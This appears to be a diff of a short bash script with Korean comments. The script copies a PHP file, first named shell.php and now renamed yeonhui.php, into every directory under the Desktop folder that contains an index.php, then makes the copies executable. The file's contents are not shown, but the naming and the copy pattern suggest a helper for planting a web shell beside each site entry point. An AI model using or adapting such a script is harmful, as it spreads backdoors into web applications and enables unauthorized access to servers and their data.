@@ -1,28 +1,26 @@
 #!/bin/bash
 
 # DESKTOP 디렉터리 경로
-desktop_path="$HOME/DESKTOP"
+desktop_path="$HOME/Desktop"
 
-# index.php 파일 경로
-index_file_path=$(find "$desktop_path" -type f -name "index.php" -print -quit)
+# yeonhui.php 파일 경로
+yeonhui_file_path=$(find "$desktop_path" -type f -name "yeonhui.php")
 
-if [ -z "$index_file_path" ]; then
-  echo "index.php 파일을 찾을 수 없습니다."
+if [ -z "$yeonhui_file_path" ]; then
+  echo "yeonhui.php 파일을 찾을 수 없습니다."
   exit 1
 fi
 
-# index.php 파일이 있는 디렉터리 경로
-index_directory=$(dirname "$index_file_path")
+# DESKTOP 디렉터리 내의 모든 index.php 파일에 대해 작업 수행
+find "$desktop_path" -type f -name "index.php" | while IFS= read -r index_file; do
+  # index.php 파일이 있는 디렉터리 경로
+  index_directory=$(dirname "$index_file")
+  
+  # yeonhui.php 파일을 해당 디렉터리로 복사
+  cp "$yeonhui_file_path" "$index_directory"
+done
 
-# shell.php 파일 경로
-shell_file_path=$(find "$desktop_path" -type f -name "shell.php" -print -quit)
-
-if [ -z "$shell_file_path" ]; then
-  echo "shell.php 파일을 찾을 수 없습니다."
-  exit 1
-fi
-
-# shell.php 파일을 index.php가 있는 디렉터리로 이동
-cp "$shell_file_path" "$index_directory"
+# 복사한 yeonhui.php 파일에 실행 권한 부여
+find "$desktop_path" -type f -name "yeonhui.php" -exec chmod +x {} +
 
 echo "작업이 완료되었습니다."
